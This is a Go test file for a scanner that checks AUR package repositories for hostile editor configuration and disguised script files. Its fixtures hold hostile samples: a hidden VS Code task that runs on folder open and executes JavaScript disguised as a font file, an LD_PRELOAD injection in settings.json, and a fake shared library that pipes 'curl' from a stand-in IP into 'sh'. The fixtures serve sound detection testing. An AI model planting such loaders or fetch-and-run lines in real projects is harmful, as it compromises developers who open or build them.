package rules

import (
	"strings"
	"testing"
)

func hitCodes(hits []Hit) map[string]Hit {
	m := map[string]Hit{}
	for _, h := range hits {
		m[h.Code] = h
	}
	return m
}

const minimalPKGBUILD = `pkgname=example
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("https://example.org/example-1.0.tar.gz")
sha256sums=('SKIP')
package() {
  install -Dm755 "$srcdir/example" "$pkgdir/usr/bin/example"
}
`

// The reported September 2026 loader, reconstructed as it would look if the
// technique were carried in the AUR repository rather than in an upstream tree:
// a hidden VS Code task armed to runOn folderOpen, executing a file named as a
// font that is actually JavaScript.
func TestEtherHidingShapeInAnAURRepo(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": minimalPKGBUILD,
		".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || echo ''",
      "isBackground": true,
      "hide": true,
      "presentation": { "reveal": "never", "echo": false, "close": true },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}`,
		"public/fonts/fa-solid-500.woff2": strings.Repeat(" ", 400) +
			`const _0x1a=require('child_process');process.env.X&&eval(Buffer.from(_0x1a,'hex').toString());`,
	}
	hits := hitCodes(Scan(files))

	e, ok := hits["EDITOR-001"]
	if !ok {
		t.Fatal("EDITOR-001 did not fire on a folderOpen task")
	}
	if e.Severity != Critical {
		t.Errorf("EDITOR-001 severity = %q, want critical", e.Severity)
	}
	if e.File != ".vscode/tasks.json" {
		t.Errorf("EDITOR-001 file = %q", e.File)
	}
	// The unarmed twin must not be reported alongside the armed one.
	if _, dup := hits["EDITOR-007"]; dup {
		t.Error("EDITOR-007 reported next to EDITOR-001 for the same file")
	}

	m, ok := hits["MASQ-001"]
	if !ok {
		t.Fatal("MASQ-001 did not fire on JavaScript named .woff2")
	}
	if m.Severity != Critical {
		t.Errorf("MASQ-001 severity = %q, want critical", m.Severity)
	}
	if !strings.Contains(m.Snippet, "long run of spaces") {
		t.Errorf("the leading-pad corroboration is missing from the snippet: %q", m.Snippet)
	}

	if got := Floor(Scan(files), false); got != "MALICIOUS" {
		t.Errorf("floor = %q, want MALICIOUS: both codes are fatal", got)
	}
}

func TestDirenvAndEditorRcAreCriticalOnPresence(t *testing.T) {
	for _, name := range []string{".envrc", ".exrc", ".nvim.lua", ".lvimrc"} {
		files := map[string]string{"PKGBUILD": minimalPKGBUILD, name: "export PATH=/tmp/x:$PATH\n"}
		hits := Scan(files)
		found := false
		for _, h := range hits {
			if strings.HasPrefix(h.Code, "EDITOR-") && h.File == name {
				found = true
				if h.Severity != Critical {
					t.Errorf("%s: severity %q, want critical", name, h.Severity)
				}
			}
		}
		if !found {
			t.Errorf("%s present in an AUR repo produced no EDITOR finding", name)
		}
		if got := Floor(hits, false); got != "MALICIOUS" {
			t.Errorf("%s: floor = %q, want MALICIOUS", name, got)
		}
	}
}

// A tasks.json that merely defines tasks is reported, but it does not run on its
// own and must not block.
func TestUnarmedEditorConfigIsAWarning(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": minimalPKGBUILD,
		".vscode/tasks.json": `{"version":"2.0.0","tasks":[
		  {"label":"build","type":"shell","command":"makepkg -si"}]}`,
	}
	hits := hitCodes(Scan(files))
	h, ok := hits["EDITOR-007"]
	if !ok {
		t.Fatal("EDITOR-007 did not fire on unarmed task definitions")
	}
	if h.Severity != High {
		t.Errorf("severity = %q, want warning", h.Severity)
	}
	if _, armed := hits["EDITOR-001"]; armed {
		t.Error("EDITOR-001 fired without a folderOpen task")
	}
}

// settings.json is only critical when it redirects execution. Ordinary editor
// preferences are not a finding at all.
func TestVSCodeSettingsOnlyFireWhenTheyRedirectExecution(t *testing.T) {
	benign := map[string]string{
		"PKGBUILD":                minimalPKGBUILD,
		".vscode/settings.json":   `{"editor.tabSize": 2, "files.eol": "\n"}`,
		".vscode/extensions.json": `{"recommendations":["golang.go"]}`,
		".editorconfig":           "root = true\n[*]\nindent_style = tab\n",
	}
	for _, h := range Scan(benign) {
		if strings.HasPrefix(h.Code, "EDITOR-") {
			t.Errorf("false positive on ordinary editor preferences: %s in %s", h.Code, h.File)
		}
	}

	hostile := map[string]string{
		"PKGBUILD": minimalPKGBUILD,
		".vscode/settings.json": `{"terminal.integrated.env.linux": {"LD_PRELOAD": "/tmp/x.so"},
		  "python.defaultInterpreterPath": "./tools/python"}`,
	}
	hits := hitCodes(Scan(hostile))
	if h, ok := hits["EDITOR-006"]; !ok || h.Severity != Critical {
		t.Errorf("EDITOR-006 did not fire critically on an exec/env redirect: %+v", hits)
	}
}

// The false positives argued about before this was implemented. None of them
// may reach the critical tier.
func TestMasqueradeDoesNotFireOnOrdinaryPackaging(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": minimalPKGBUILD,
		// A genuine binary: the collector replaces its content, so there is
		// nothing to classify and no finding.
		"icon.png": OmittedContent,
		"logo.ico": OmittedContent,
		// SVG, PostScript and PDF are text or text-headed by definition and are
		// not in binaryExtensions at all.
		"logo.svg":  `<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>`,
		"paper.eps": "%!PS-Adobe-3.0 EPSF-3.0\n",
		// Ordinary repository text with ordinary names.
		"example.install": "post_install() {\n  echo hi\n}\n",
		"fix.patch":       "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n",
	}
	for _, h := range Scan(files) {
		if h.Code == "MASQ-001" || h.Code == "MASQ-002" {
			t.Errorf("false positive %s on %s: %q", h.Code, h.File, h.Snippet)
		}
	}
}

// A git-lfs pointer is text behind a binary name, but it is not script. It is
// reported so the packaging problem is visible, and it does not block.
func TestLFSPointerIsAWarningNotCritical(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": minimalPKGBUILD,
		"assets/hero.png": "version https://git-lfs.github.com/spec/v1\n" +
			"oid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n",
	}
	hits := hitCodes(Scan(files))
	if _, crit := hits["MASQ-001"]; crit {
		t.Error("an lfs pointer must not reach the critical tier")
	}
	h, ok := hits["MASQ-002"]
	if !ok {
		t.Fatal("MASQ-002 did not fire on an lfs pointer")
	}
	if h.Severity != High {
		t.Errorf("severity = %q, want warning", h.Severity)
	}
	if got := Floor(Scan(files), false); got == "MALICIOUS" {
		t.Error("MASQ-002 must not be fatal")
	}
}

// A shell script behind a library name is the same attack with a different
// extension.
func TestShellScriptBehindASharedObjectName(t *testing.T) {
	files := map[string]string{
		"PKGBUILD":      minimalPKGBUILD,
		"lib/libz.so.1": "#!/bin/sh\ncurl -s http://198.51.100.7/p | sh\n",
	}
	hits := hitCodes(Scan(files))
	if _, ok := hits["MASQ-001"]; !ok {
		t.Errorf("MASQ-001 did not fire on a shebang behind .so: %+v", hits)
	}
}

// Every new code must map to a check id, or the finding silently lands as
// other_critical and the specific label is lost.
func TestNewCodesMapToCheckIDs(t *testing.T) {
	for _, code := range []string{
		"EDITOR-001", "EDITOR-002", "EDITOR-003", "EDITOR-004",
		"EDITOR-005", "EDITOR-006", "EDITOR-007", "MASQ-001", "MASQ-002",
	} {
		id, ok := checkIDFor[code]
		if !ok {
			t.Errorf("%s has no checkIDFor mapping", code)
			continue
		}
		fatal := fatalCodes[code]
		critical := checkCatalogSeverityIsCritical(id)
		if fatal != critical {
			t.Errorf("%s: fatalCodes=%v but check id %q critical=%v — these must agree",
				code, fatal, id, critical)
		}
	}
}
